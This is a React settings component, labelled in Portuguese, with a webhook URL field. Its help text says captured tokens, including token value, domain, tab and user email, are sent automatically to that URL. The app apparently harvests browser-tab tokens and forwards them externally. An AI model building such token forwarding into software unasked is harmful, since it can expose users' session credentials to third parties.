import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Webhook } from 'lucide-react';

interface IntegrationSettingsProps {
  settings: {
    webhook_url: string;
  };
  onUpdate: (updates: Partial<{ webhook_url: string }>) => void;
}

export function IntegrationSettings({ settings, onUpdate }: IntegrationSettingsProps) {
  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Webhook className="h-5 w-5" />
          Integrações
        </CardTitle>
        <CardDescription>
          Configure integrações com sistemas externos
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="space-y-2">
          <Label htmlFor="webhook-url">URL do Webhook para Tokens</Label>
          <Input
            id="webhook-url"
            type="url"
            placeholder="https://exemplo.com/api/webhook"
            value={settings.webhook_url}
            onChange={(e) => onUpdate({ webhook_url: e.target.value })}
          />
          <p className="text-xs text-muted-foreground">
            Quando um token é capturado, ele será enviado automaticamente para esta URL.
            O payload inclui: tab_id, tab_name, domain, token_name, token_value, captured_at e user_email.
          </p>
        </div>
      </CardContent>
    </Card>
  );
}
